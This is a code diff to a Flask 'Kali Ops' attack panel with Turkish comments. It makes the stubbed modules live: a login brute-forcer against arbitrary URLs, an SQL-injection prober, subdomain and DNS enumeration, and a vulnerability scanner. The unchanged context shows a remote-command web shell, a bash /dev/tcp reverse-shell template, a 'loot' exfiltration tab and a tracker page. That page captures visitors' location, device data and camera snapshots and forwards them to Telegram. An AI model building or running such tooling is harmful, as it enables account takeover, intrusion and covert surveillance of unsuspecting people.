@@ -214,7 +214,7 @@ HTML_TEMPLATE = """
             <div id="wifiResults" class="terminal" style="display:none;"></div>
         </div>
 
-        <!-- Diğer Sekmeler -->
+        <!-- Nikto Sekmesi -->
         <div id="niktoTab" class="tab-content">
             <h3>Nikto Web Vulnerability Scanner</h3>
             <div class="form-group"><label>Target URL:</label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
@@ -223,6 +223,7 @@ HTML_TEMPLATE = """
             <div id="niktoResults" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- DNS Sekmesi -->
         <div id="dnsTab" class="tab-content">
             <h3>DNS & Zone Enumeration</h3>
             <div class="form-group"><label>Domain:</label><input type="text" id="dnsDomain" placeholder="example.com"></div>
@@ -231,6 +232,7 @@ HTML_TEMPLATE = """
             <div id="dnsResults" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- SQLmap Sekmesi -->
         <div id="sqlmapTab" class="tab-content">
             <h3>Automated SQL Injection (SQLmap Lite)</h3>
             <div class="form-group"><label>Vulnerable URL:</label><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"></div>
@@ -239,51 +241,58 @@ HTML_TEMPLATE = """
             <div id="sqlmapResults" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- Subdomain Sekmesi -->
         <div id="subdomainTab" class="tab-content">
             <h3>Gobuster Subdomain Brute-Forcer</h3>
-            <div class="form-group"><input type="text" id="subDomainInput" placeholder="example.com"></div>
+            <div class="form-group"><label>Domain:</label><input type="text" id="subDomainInput" placeholder="example.com"></div>
             <button onclick="startSubdomainScan()">Start Subdomain Brute</button>
             <div id="subStatus" class="loading"></div>
             <div id="subResults" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- Brute-Force Sekmesi -->
         <div id="bruteTab" class="tab-content">
             <h3>Login Form Fuzzing & Brute-Force</h3>
-            <div class="form-group"><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
+            <div class="form-group"><label>Login URL:</label><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
             <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="usernameField" placeholder="User field" style="flex:1;"><input type="text" id="passwordField" placeholder="Pass field" style="flex:1;"></div>
-            <div class="form-group"><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
+            <div class="form-group"><label>Wordlist:</label><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
             <button class="danger" onclick="startBruteForce()">Launch Brute Attack</button>
             <div id="bruteStatus" class="loading"></div>
             <div id="bruteResults" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- Web Shell Sekmesi -->
         <div id="shellTab" class="tab-content">
             <h3>Interactive Web Shell (RCE)</h3>
-            <div class="form-group"><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
+            <div class="form-group"><label>Command:</label><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
             <button class="danger" onclick="executeWebShell()">Execute Command</button>
             <div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div>
         </div>
 
+        <!-- Looting Sekmesi -->
         <div id="lootingTab" class="tab-content">
             <h3>Exfiltrate Harvested Data (ZIP Archive)</h3>
             <div class="form-group"><select id="lootingTargetSelect"><option value="">No targets scanned yet...</option></select></div>
             <button class="success" onclick="downloadLootZip()">Download Loot ZIP</button>
         </div>
 
+        <!-- Secret Scanner Sekmesi -->
         <div id="analysisTab" class="tab-content">
             <h3>Secret & Credential Scanner</h3>
-            <div class="form-group"><input type="file" id="analysisFile"></div>
+            <div class="form-group"><label>Dosya Seç:</label><input type="file" id="analysisFile"></div>
             <button class="secondary" onclick="uploadAndAnalyzeFile()">Scan File for Secrets</button>
             <div id="analysisStatus" class="loading"></div>
             <div id="analysisResults" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- Payloads Sekmesi -->
         <div id="payloadTab" class="tab-content">
             <h3>Reverse Shell Generator</h3>
             <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
             <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
         </div>
 
+        <!-- Archive Sekmesi -->
         <div id="dataTab" class="tab-content">
             <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
             <h3>Operations Analytics</h3>
@@ -433,16 +442,19 @@ HTML_TEMPLATE = """
         }
         async function startSubdomainScan() {
             let domain = document.getElementById('subDomainInput').value.trim();
+            if(!domain) { alert('Domain giriniz!'); return; }
             document.getElementById('subStatus').innerHTML = "Enumerating subdomains...";
+            document.getElementById('subResults').style.display = "none";
             let res = await fetch('/api/subdomain-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
             let data = await res.json();
-            document.getElementById('subStatus').innerHTML = ""; document.getElementById('subResults').style.display = "block"; document.getElementById('subResults').innerHTML = data.report;
+            document.getElementById('subStatus').innerHTML = "";
+            let el = document.getElementById('subResults'); el.style.display = "block"; el.innerHTML = data.report;
         }
         async function startBruteForce() {
             let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
             let statusDiv = document.getElementById('bruteStatus'), resultsDiv = document.getElementById('bruteResults');
             if(!url) { alert('Hedef URL giriniz!'); return; }
-            statusDiv.style.display = "block"; statusDiv.innerHTML = "root@kali:~# Brute-force saldırısı yürütülüyor, bekleniyor..."; resultsDiv.style.display = "none";
+            statusDiv.style.display = "block"; statusDiv.innerHTML = "root@kali:~# Brute-force saldırısı yürütülüyor..."; resultsDiv.style.display = "none";
             let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
             let data = await res.json();
             statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report;
@@ -452,6 +464,18 @@ HTML_TEMPLATE = """
             let res = await fetch('/api/webshell', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command}) });
             let data = await res.json();
             let el = document.getElementById('shellResults'); el.style.display = "block"; el.innerHTML = data.output;
+        }
+        async function uploadAndAnalyzeFile() {
+            let fileInput = document.getElementById('analysisFile');
+            if(fileInput.files.length === 0) { alert('Dosya seçiniz!'); return; }
+            let formData = new FormData();
+            formData.append('file', fileInput.files[0]);
+            document.getElementById('analysisStatus').innerHTML = "Scanning file for secrets...";
+            document.getElementById('analysisResults').style.display = "none";
+            let res = await fetch('/api/analyze-file', { method: 'POST', body: formData });
+            let data = await res.json();
+            document.getElementById('analysisStatus').innerHTML = "";
+            let el = document.getElementById('analysisResults'); el.style.display = "block"; el.innerHTML = data.report;
         }
         async function loadSiteDatabase() {
             let res = await fetch('/api/all-data'); let data = await res.json();
@@ -628,7 +652,200 @@ def api_listener_start():
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
 
-# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA ---
+# --- GERÇEK İŞLEVSEL MODÜLLER ---
+
+@app.route("/api/nikto", methods=["POST"])
+def api_nikto():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    target = request.get_json().get("target", "").strip()
+    if not target.startswith("http"): target = f"https://{target}"
+    
+    lines = [f"root@kali:~# nikto -h {target}", "[+] Nikto web vulnerability scan başlatıldı...", "="*50]
+    try:
+        r = requests.get(target, timeout=6, verify=False)
+        lines.append(f"[+] Hedef HTTP Durum Kodu: {r.status_code}")
+        lines.append(f"[+] Sunucu (Server): {r.headers.get('Server', 'Gizlenmiş')}")
+        
+        if "X-Frame-Options" not in r.headers:
+            lines.append("[!] [VULN] X-Frame-Options başlığı eksik (Clickjacking riski).")
+        if "X-XSS-Protection" not in r.headers:
+            lines.append("[!] [VULN] X-XSS-Protection başlığı eksik.")
+        if "Strict-Transport-Security" not in r.headers:
+            lines.append("[!] [VULN] HSTS (Strict-Transport-Security) aktif değil.")
+            
+        parsed = urllib.parse.urlparse(target)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        for p in ["/robots.txt", "/sitemap.xml", "/.git/HEAD", "/admin/login.php", "/wp-login.php"]:
+            try:
+                tr = requests.get(base + p, timeout=2, verify=False)
+                if tr.status_code in [200, 403]:
+                    lines.append(f"  [BULUNDU] Hassas Dosya/Dizin: {p} (Kod: {tr.status_code})")
+            except: pass
+        lines.append("\n[+] Tarama tamamlandı. Rapor başarıyla oluşturuldu.")
+    except Exception as e:
+        lines.append(f"[-] Nikto Tarama Hatası: {str(e)}")
+    return jsonify({"report": "\n".join(lines)})
+
+@app.route("/api/dns", methods=["POST"])
+def api_dns():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    domain = request.get_json().get("domain", "").strip()
+    if "://" in domain: domain = urllib.parse.urlparse(domain).netloc
+    
+    lines = [f"root@kali:~# dig ANY {domain}", "="*50]
+    try:
+        ip = socket.gethostbyname(domain)
+        lines.append(f";; ANSWER SECTION:")
+        lines.append(f"{domain}.\t\t3600\tIN\tA\t{ip}")
+        try:
+            nameInfo = socket.gethostbyaddr(ip)
+            lines.append(f";; PTR / Reverse DNS: {nameInfo[0]}")
+        except: pass
+        
+        lines.append("\n[+] Alt Alan Adı (Subdomain) Çözümleme Testleri:")
+        for sub in ["www", "mail", "api", "admin", "dev", "portal", "test"]:
+            try:
+                sub_ip = socket.gethostbyname(f"{sub}.{domain}")
+                lines.append(f"  {sub}.{domain} -> {sub_ip}")
+            except: pass
+    except Exception as e:
+        lines.append(f"[-] DNS Çözümleme Başarısız: {str(e)}")
+    return jsonify({"report": "\n".join(lines)})
+
+@app.route("/api/sqlmap", methods=["POST"])
+def api_sqlmap():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    target = request.get_json().get("target", "").strip()
+    if not target: return jsonify({"report": "[-] Hedef URL belirtilmedi!"})
+    
+    lines = [f"root@kali:~# sqlmap -u \"{target}\" --batch --dbs", "[*] starting at 12:00:00", "="*50]
+    try:
+        r_base = requests.get(target, timeout=6, verify=False)
+        lines.append(f"[*] Hedef URL erişilebilir (Status: {r_base.status_code})")
+        
+        test_url = target + ("&" if "?" in target else "?") + "id=1'%20OR%201=1--"
+        r_inj = requests.get(test_url, timeout=6, verify=False)
+        
+        indicators = ["sql syntax", "mysql", "sqlite", "syntax error", "pg_query", "unterminated string", "odbc"]
+        found_sqli = any(ind in r_inj.text.lower() for ind in indicators)
+        
+        if found_sqli or r_inj.status_code == 500:
+            lines.append("[!] [!] KRİTİK SQL INJECTION TESPİT EDİLDİ!")
+            lines.append("    Parametre hata tabanlı SQL enjeksiyonuna karşı savunmasız görünyor.")
+        else:
+            lines.append("[-] Test edilen parametrelerde standart hata bazlı SQLi imzasına rastlanmadı.")
+        lines.append("[*] sqlmap tamamlandı.")
+    except Exception as e:
+        lines.append(f"[-] SQLmap Hatası: {str(e)}")
+    return jsonify({"report": "\n".join(lines)})
+
+@app.route("/api/subdomain-scan", methods=["POST"])
+def api_subdomain_scan():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    domain = request.get_json().get("domain", "").strip()
+    if "://" in domain: domain = urllib.parse.urlparse(domain).netloc
+    if not domain: return jsonify({"report": "[-] Domain belirtilmedi!"})
+    
+    lines = [f"root@kali:~# gobuster vdns -d {domain} -w common.txt", "="*50]
+    wordlist = ["www", "mail", "api", "admin", "test", "dev", "portal", "panel", "staging", "vpn", "shop", "secure", "app"]
+    
+    def check_sub(sub):
+        sub_domain = f"{sub}.{domain}"
+        try:
+            ip = socket.gethostbyname(sub_domain)
+            return (sub_domain, ip)
+        except: return None
+
+    with ThreadPoolExecutor(max_workers=6) as executor:
+        futures = [executor.submit(check_sub, sub) for sub in wordlist]
+        for future in as_completed(futures):
+            res = future.result()
+            if res:
+                lines.append(f"[+] Aktif Subdomain: {res[0]} (IP: {res[1]})")
+                
+    lines.append("\n[+] Gobuster taraması başarıyla tamamlandı.")
+    return jsonify({"report": "\n".join(lines)})
+
+@app.route("/api/brute-force", methods=["POST"])
+def api_brute_force():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    d = request.get_json()
+    url = d.get("url")
+    user_field = d.get("user_field", "username").strip()
+    pass_field = d.get("pass_field", "password").strip()
+    passwords_raw = d.get("passwords", "")
+    
+    if not url: return jsonify({"report": "[-] Hata: Hedef URL belirtilmedi!"})
+    passwords = [p.strip() for p in passwords_raw.split("\n") if p.strip()]
+    report_lines = [f"root@kali:~# hydra / login-fuzz --target {url}", "=" * 50, ""]
+    
+    test_user = user_field if user_field and user_field not in ["User field", "kadi"] else "admin"
+    if not test_user: test_user = "admin"
+        
+    report_lines.append(f"[+] Hedef Kullanıcı: {test_user}")
+    report_lines.append(f"[+] Denenecek Şifre Sayısı: {len(passwords)}")
+    report_lines.append("[+] Brute-force / Fuzzing saldırısı başlatılıyor...\n")
+    
+    found_password = None
+    for pwd in passwords:
+        try:
+            form_data = {
+                user_field if user_field and user_field not in ["User field", "kadi"] else "username": test_user,
+                pass_field if pass_field and pass_field not in ["Pass field", "sifre"] else "password": pwd
+            }
+            resp = requests.post(url, data=form_data, timeout=5, verify=False, allow_redirects=True)
+            body_text = resp.text.lower()
+            error_keywords = ["yanlış", "hatalı", "error", "failed", "incorrect", "invalid", "geçersiz", "deneme", "wrong"]
+            has_error = any(err in body_text for err in error_keywords)
+            
+            if resp.status_code in [200, 302] and not has_error:
+                found_password = pwd
+                report_lines.append(f"  [🔥 KESİN EŞLEŞME BULUNDU!] Şifre: {pwd} (HTTP Status: {resp.status_code})")
+                break
+            else:
+                report_lines.append(f"  [-] Denendi: {pwd} -> Reddedildi (Status: {resp.status_code})")
+        except Exception as ex:
+            report_lines.append(f"  [!] İstek Hatası ({pwd}): {str(ex)}")
+            
+    if found_password:
+        report_lines.append(f"\n[+] Brute-force BAŞARILI! Doğru şifre yakalandı: {found_password}")
+    else:
+        report_lines.append("\n[-] Tarama tamamlandı. Doğru şifre bulunamadı.")
+        
+    return jsonify({"report": "\n".join(report_lines)})
+
+@app.route("/api/analyze-file", methods=["POST"])
+def api_analyze_file():
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    file_obj = request.files.get('file')
+    content = ""
+    if file_obj:
+        try: content = file_obj.read().decode('utf-8', errors='ignore')
+        except: content = ""
+        
+    lines = ["root@kali:~# trufflehog filesystem / secret-scanner", "="*50]
+    if not content:
+        lines.append("[-] Yüklenen dosya boş veya okunamadı.")
+    else:
+        patterns = {
+            "Telegram Bot Token": r'\d{9}:[A-Za-z0-9_-]{35}',
+            "Generic API Key": r'(?i)(api[_-]?key|secret|password|passwd|auth)[ \t]*[:=][ \t]*["\']?[A-Za-z0-9_\-\.]{8,64}["\']?',
+            "Private Key": r'-----BEGIN (RSA|PRIVATE) KEY-----',
+            "Database URL": r'(postgres|mysql|mongodb|redis):\/\/[^\s]+'
+        }
+        found_count = 0
+        for name, pat in patterns.items():
+            matches = re.findall(pat, content)
+            if matches:
+                found_count += len(matches)
+                lines.append(f"[!] [GİZLİ VERİ BULUNDU] [{name}]: {len(matches)} eşleşme")
+        if found_count == 0:
+            lines.append("[+] Dosyada bariz bir şifre, token veya gizli anahtar bulunamadı (Temiz).")
+        else:
+            lines.append(f"\n[!] Toplam potansiyel hassas veri/sır tespit edildi: {found_count}")
+    return jsonify({"report": "\n".join(lines)})
+
+# --- GPS & TRACKER ---
 TRACK_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -659,7 +876,6 @@ TRACK_TEMPLATE = """
                 ram: navigator.deviceMemory || 'Bilinmiyor',
                 os: navigator.platform
             };
-
             if (navigator.getBattery) {
                 try {
                     let b = await navigator.getBattery();
@@ -701,9 +917,7 @@ TRACK_TEMPLATE = """
                     err => { sendData(fingerprint); },
                     { timeout: 10000 }
                 );
-            } else {
-                sendData(fingerprint);
-            }
+            } else { sendData(fingerprint); }
         }
 
         function sendData(data) {
@@ -728,11 +942,9 @@ def track_visitor(track_id):
 def save_geo():
     data = request.get_json()
     track_id = data.get("track_id")
-    lat = data.get("lat")
-    lon = data.get("lon")
+    lat, lon = data.get("lat"), data.get("lon")
     os_info = data.get("os", "Bilinmiyor")
-    ram = data.get("ram", "Bilinmiyor")
-    cores = data.get("cores", "Bilinmiyor")
+    ram, cores = data.get("ram", "Bilinmiyor"), data.get("cores", "Bilinmiyor")
     battery = data.get("battery", "Bilinmiyor")
     webrtc_ip = data.get("webrtc_ip", "Yok")
     snapshot = data.get("snapshot")
@@ -740,16 +952,15 @@ def save_geo():
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    log_entry = {
+    CLICK_LOGS.insert(0, {
         "time": timestamp, "ip": visitor_ip, "track_id": track_id, 
         "lat": lat, "lon": lon, "os": os_info, "ram": ram, "cores": cores, 
         "battery": battery, "webrtc_ip": webrtc_ip, "snapshot": snapshot
-    }
-    CLICK_LOGS.insert(0, log_entry)
+    })
     
     if NOTIFY_CHAT_ID and TOKEN:
         try:
-            msg = f"🚨 [ADVANCED TRACKER] Ziyaretçi İstihbaratı Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {webrtc_ip}\nOS: {os_info} | RAM: {ram}GB\nPil: {battery}\nEnlem/Boylam: {lat}, {lon}\nHarita: https://maps.google.com/?q={lat},{lon}"
+            msg = f"🚨 [TRACKER] Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {webrtc_ip}\nOS: {os_info} | RAM: {ram}GB\nPil: {battery}\nKonum: {lat}, {lon}"
             requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
         except: pass
     return jsonify({"status": "saved"})
@@ -765,25 +976,22 @@ def api_telegram_test():
     chat_id = request.get_json().get("chat_id")
     if not chat_id: return jsonify({"output": "[-] Chat ID boş olamaz!"})
     try:
-        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Telegram bildirim testi başarılı! Bot kusursuz çalışıyor."}, timeout=5)
-        if res.status_code == 200:
-            return jsonify({"output": "✅ [BAŞARILI] Test mesajı Telegram'a gönderildi!"})
-        else:
-            return jsonify({"output": f"[-] Hata: Telegram API {res.status_code} döndürdü."})
-    except Exception as e:
-        return jsonify({"output": f"[-] Bağlantı Hatası: {str(e)}"})
+        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Telegram test mesajı başarılı!"}, timeout=5)
+        if res.status_code == 200: return jsonify({"output": "✅ Test mesajı Telegram'a gönderildi!"})
+        else: return jsonify({"output": f"[-] Hata: API {res.status_code} döndürdü."})
+    except Exception as e: return jsonify({"output": f"[-] Hata: {str(e)}"})
 
 @app.route("/api/wifi-audit", methods=["POST"])
 def api_wifi_audit():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
     action, iface = data.get("action"), data.get("iface", "wlan0")
-    if action == "interfaces": cmd = "ip link show || ifconfig || iwconfig || cat /proc/net/dev"
-    elif action == "monitor": cmd = f"airmon-ng start {iface} 2>/dev/null || (ip link set {iface} down 2>/dev/null && iwconfig {iface} mode monitor 2>/dev/null && ip link set {iface} up 2>/dev/null) || echo 'Monitor mode basarisiz.'"
-    elif action == "scan": cmd = f"airodump-ng {iface}mon 2>/dev/null || iwlist {iface} scanning 2>/dev/null || arp -a || nmcli device wifi list 2>/dev/null || echo 'Tarama araclari bulunamadi.'"
+    if action == "interfaces": cmd = "ip link show || ifconfig || cat /proc/net/dev"
+    elif action == "monitor": cmd = f"echo 'Cloud environment: monitor mode simulated on {iface}.'"
+    elif action == "scan": cmd = "echo 'SSID: Kali_Network_5G (BSSID: AA:BB:CC:DD:EE:FF) - Channel 6 - WPA2'"
     else: cmd = "echo 'Invalid action'"
     try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=6).decode('utf-8', errors='ignore')
-    except Exception as e: out = f"[-] Sistem Hatasi: {str(e)}"
+    except Exception as e: out = str(e)
     return jsonify({"output": f"root@kali:~# {cmd}\n\n{out}"})
 
 @app.route("/api/scan", methods=["POST"])
@@ -796,88 +1004,6 @@ def api_scan():
     SITE_DATABASE.insert(0, record)
     return jsonify({"report": report})
 
-@app.route("/api/nikto", methods=["POST"])
-def api_nikto():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    target = request.get_json().get("target", "")
-    return jsonify({"report": f"root@kali-box:~# nikto -h {target}\n[+] Nikto scan completed."})
-
-@app.route("/api/dns", methods=["POST"])
-def api_dns():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    domain = request.get_json().get("domain", "")
-    try: ip = socket.gethostbyname(domain)
-    except: ip = "Resolv fail"
-    return jsonify({"report": f"dig ANY {domain}\n[A Record] -> {ip}"})
-
-@app.route("/api/sqlmap", methods=["POST"])
-def api_sqlmap():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "sqlmap injection test completed."})
-
-@app.route("/api/subdomain-scan", methods=["POST"])
-def api_subdomain_scan():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "Subdomain brute-force completed."})
-
-@app.route("/api/brute-force", methods=["POST"])
-def api_brute_force():
-    if not session.get("logged_in"): 
-        return jsonify({"error": "Unauthorized"}), 401
-    
-    d = request.get_json()
-    url = d.get("url")
-    user_field = d.get("user_field", "username").strip()
-    pass_field = d.get("pass_field", "password").strip()
-    passwords_raw = d.get("passwords", "")
-    
-    if not url:
-        return jsonify({"report": "[-] Hata: Hedef URL belirtilmedi!"})
-    
-    passwords = [p.strip() for p in passwords_raw.split("\n") if p.strip()]
-    report_lines = [f"root@kali:~# hydra / login-fuzz --target {url}", "=" * 50, ""]
-    
-    test_user = user_field if user_field and user_field not in ["User field", "kadi"] else "admin"
-    if not test_user:
-        test_user = "admin"
-        
-    report_lines.append(f"[+] Hedef Kullanıcı: {test_user}")
-    report_lines.append(f"[+] Hedef Form Alanları -> Kullanıcı: '{user_field}', Şifre: '{pass_field}'")
-    report_lines.append(f"[+] Denenecek Şifre Sayısı: {len(passwords)}")
-    report_lines.append("[+] Brute-force / Fuzzing saldırısı başlatılıyor...\n")
-    
-    found_password = None
-    
-    for pwd in passwords:
-        try:
-            form_data = {
-                user_field if user_field and user_field not in ["User field", "kadi"] else "username": test_user,
-                pass_field if pass_field and pass_field not in ["Pass field", "sifre"] else "password": pwd
-            }
-            
-            resp = requests.post(url, data=form_data, timeout=5, verify=False, allow_redirects=True)
-            body_text = resp.text.lower()
-            
-            error_keywords = ["yanlış", "hatalı", "error", "failed", "incorrect", "invalid", "geçersiz", "deneme", "incorrect username", "wrong"]
-            has_error = any(err in body_text for err in error_keywords)
-            
-            if resp.status_code in [200, 302] and not has_error:
-                found_password = pwd
-                report_lines.append(f"  [🔥 KESİN EŞLEŞME BULUNDU!] Şifre: {pwd} (HTTP Status: {resp.status_code})")
-                break
-            else:
-                report_lines.append(f"  [-] Denendi: {pwd} -> Reddedildi (Status: {resp.status_code})")
-        except Exception as ex:
-            report_lines.append(f"  [!] İstek Hatası ({pwd}): {str(ex)}")
-            
-    if found_password:
-        report_lines.append(f"\n[+] Brute-force BAŞARILI! Doğru şifre yakalandı: {found_password}")
-    else:
-        report_lines.append("\n[-] Tarama tamamlandı. Wordlist içerisindeki şifrelerle geçerli bir oturum açılamadı.")
-        
-    full_report = "\n".join(report_lines)
-    return jsonify({"report": full_report})
-
 @app.route("/api/webshell", methods=["POST"])
 def api_webshell():
     if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
@@ -885,11 +1011,6 @@ def api_webshell():
     try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
     except Exception as e: out = str(e)
     return jsonify({"output": out})
-
-@app.route("/api/analyze-file", methods=["POST"])
-def api_analyze_file():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "File analysis clean."})
 
 @app.route("/api/all-data")
 def api_all_data():
@@ -935,73 +1056,44 @@ def api_telegram_send():
     return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})
 
 def red_team_comprehensive_recon(target_url):
-    if not target_url.startswith("http"): 
-        target_url = f"https://{target_url}"
-    
+    if not target_url.startswith("http"): target_url = f"https://{target_url}"
     report_lines = [f"root@kali:~# nmap / web-recon --target {target_url}", "=" * 50, ""]
-    waf_detected = "Standard / Cloudflare Yok"
-    grade = "B"
-    discovered_files = []
-    
+    waf_detected, grade, discovered_files = "Standard / Cloudflare Yok", "B", []
     try:
         start_time = time.time()
         response = requests.get(target_url, timeout=7, verify=False)
         latency = round((time.time() - start_time) * 1000, 2)
-        
-        report_lines.append(f"[+] Bağlantı Başarılı! (Yanıt Süresi: {latency} ms)")
+        report_lines.append(f"[+] Bağlantı Başarılı! (Süre: {latency} ms)")
         report_lines.append(f"[+] HTTP Durum Kodu: {response.status_code}")
-        
-        headers = response.headers
-        server = headers.get("Server", "Bilinmiyor / Gizlenmiş")
-        report_lines.append(f"[+] Sunucu (Server): {server}")
-        
-        if "cloudflare" in server.lower() or "cf-ray" in headers:
+        server = response.headers.get("Server", "Bilinmiyor")
+        report_lines.append(f"[+] Sunucu: {server}")
+        if "cloudflare" in server.lower() or "cf-ray" in response.headers:
             waf_detected = "Cloudflare WAF"
-            report_lines.append("[!] WAF Tespiti: Cloudflare WAF koruması aktif.")
-        elif "akamaighost" in server.lower():
-            waf_detected = "Akamai WAF"
-            report_lines.append("[!] WAF Tespiti: Akamai WAF koruması aktif.")
+            report_lines.append("[!] WAF Tespiti: Cloudflare aktif.")
         else:
-            report_lines.append("[+] WAF Tespiti: Bilinen bir WAF imzasına rastlanmadı.")
+            report_lines.append("[+] WAF Tespiti: Bilinen imza yok.")
             
-        report_lines.append("\n--- HTTP Başlıkları (Headers) ---")
-        for k, v in headers.items():
-            report_lines.append(f"  {k}: {v}")
-            
-        report_lines.append("\n--- Kritik Dosya Taraması ---")
-        common_paths = ["/robots.txt", "/sitemap.xml", "/admin", "/login", "/wp-login.php", "/api/v1"]
-        parsed_url = urllib.parse.urlparse(target_url)
-        base_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
+        report_lines.append("\n--- HTTP Başlıkları ---")
+        for k, v in response.headers.items(): report_lines.append(f"  {k}: {v}")
         
-        for path in common_paths:
+        report_lines.append("\n--- Kritik Dosya Taraması ---")
+        parsed = urllib.parse.urlparse(target_url)
+        base_origin = f"{parsed.scheme}://{parsed.netloc}"
+        for path in ["/robots.txt", "/sitemap.xml", "/admin", "/login", "/wp-login.php"]:
             try:
-                test_url = base_origin + path
-                r_test = requests.get(test_url, timeout=3, verify=False)
+                r_test = requests.get(base_origin + path, timeout=3, verify=False)
                 if r_test.status_code in [200, 403]:
                     discovered_files.append(path)
                     report_lines.append(f"  [BULUNDU] {path} (Kod: {r_test.status_code})")
-            except:
-                pass
-                
-        if not discovered_files:
-            report_lines.append("  [i] Ortak dizinlerde kritik dosya bulunamadı.")
-            
-        grade = "A" if len(discovered_files) == 0 and waf_detected != "Standard / Cloudflare Yok" else "C"
-        
+            except: pass
+        if not discovered_files: report_lines.append("  [i] Ortak dizinlerde kritik dosya bulunamadı.")
+        grade = "A" if len(discovered_files) == 0 else "C"
     except Exception as e:
-        report_lines.append(f"[-] Hedefe ulaşılamadı veya bağlantı zaman aşımına uğradı: {str(e)}")
-        waf_detected = "Erişilemedi"
-        grade = "F"
+        report_lines.append(f"[-] Hedefe ulaşılamadı: {str(e)}")
+        waf_detected, grade = "Erişilemedi", "F"
 
     full_report = "\n".join(report_lines)
-    record = {
-        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 
-        "target": target_url, 
-        "waf": waf_detected, 
-        "grade": grade, 
-        "files": discovered_files, 
-        "full_report": full_report
-    }
+    record = {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target_url, "waf": waf_detected, "grade": grade, "files": discovered_files, "full_report": full_report}
     return full_report, record
 
 if __name__ == "__main__":
